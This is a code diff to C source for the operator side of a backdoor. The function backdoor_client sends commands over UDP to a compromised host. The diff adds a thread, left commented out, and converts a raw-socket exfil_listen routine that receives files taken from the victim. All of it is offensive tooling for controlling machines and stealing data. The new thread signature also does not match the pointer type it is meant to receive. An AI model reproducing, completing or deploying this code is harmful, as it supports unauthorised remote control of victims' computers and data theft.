@@ -22,6 +22,7 @@ void backdoor_client(uint32 ipaddr, int dport, int duplex)
 	struct sockaddr_in saddr;
 	char command[MAX_LEN];
 	pthread_t list_thread;
+	pthread_t exfil_thread;
 
 	sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
 	bzero(&saddr, sizeof(saddr));
@@ -41,6 +42,10 @@ void backdoor_client(uint32 ipaddr, int dport, int duplex)
 		closing = 0;
 		pthread_create(&list_thread, NULL, listen_thread, &saddr);
 	}
+
+	// exfil thread
+	//pthread_create(&exfil_thread, NULL, exfil_listen, &saddr);
+	
 
 	printf("Ready, awaiting your command...\n");
 	while(fgets(command, MAX_LEN, stdin) != NULL)
@@ -81,6 +86,8 @@ void backdoor_client(uint32 ipaddr, int dport, int duplex)
 		closing = 1;
 		pthread_join(list_thread, NULL);
 	}
+
+	//pthread_join(exfil_thread, NULL);
 }
 
 void *listen_thread(void *arg)
@@ -124,7 +131,7 @@ int val_port(int port)
 		return 0;
 }
 
-void exfil_listen(uint32 src_addr)
+void *exfil_listen(void *arg)
 {
 	int sock;
 	char buf[MAX_LEN];
@@ -132,6 +139,7 @@ void exfil_listen(uint32 src_addr)
 	uint64 timestamp;
 	char fname[MAX_LEN];
 	FILE* file;
+	uint32 src_addr = *(uint32*)arg;
 
 	sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
 	if(sock < 0)
